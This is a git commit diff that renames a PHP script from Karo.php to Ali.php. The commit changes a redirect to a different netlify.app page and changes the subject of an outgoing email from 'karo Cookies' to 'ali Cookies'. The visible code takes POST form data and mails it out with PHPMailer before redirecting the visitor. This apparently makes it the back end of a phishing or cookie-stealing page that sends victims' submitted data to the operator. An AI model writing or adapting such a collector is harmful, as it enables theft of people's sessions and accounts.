8fe56d9bf664c3d0392309dc99a088a46f7062f5
Uzar33921 <tiktokworkingsteam@gmail.com>
2025-08-04 11:18:28 +0500

    Update and rename Karo.php to Ali.php

--- Ali.php
+++ Ali.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://prismatic-tanuki-4cc59b.netlify.app/");
+header("Location: https://boisterous-macaron-8460f7.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -44,7 +44,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'karo Cookies';
+        $mail->Subject = 'ali Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
